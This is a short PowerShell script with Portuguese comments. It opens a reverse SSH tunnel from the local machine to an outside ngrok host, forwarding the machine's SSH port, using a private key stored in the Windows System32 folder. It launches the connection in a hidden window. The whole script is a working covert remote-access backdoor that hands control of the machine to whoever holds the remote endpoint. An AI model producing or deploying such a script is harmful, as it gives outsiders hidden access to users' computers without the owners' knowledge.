# Caminho do SSH
$sshPath = "C:\Windows\System32\OpenSSH\ssh.exe"

# Caminho da chave privada
$keyPath = "C:\Windows\System32\OpenSSH\revssh_key"

# Argumentos do SSH
$sshArgs = "-i `"$keyPath`" -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes -R 2222:localhost:22 logosofico@0.tcp.sa.ngrok.io -p 12255 -N"

# Executa SSH em segundo plano invisível
Start-Process -FilePath $sshPath -ArgumentList $sshArgs -WindowStyle Hidden
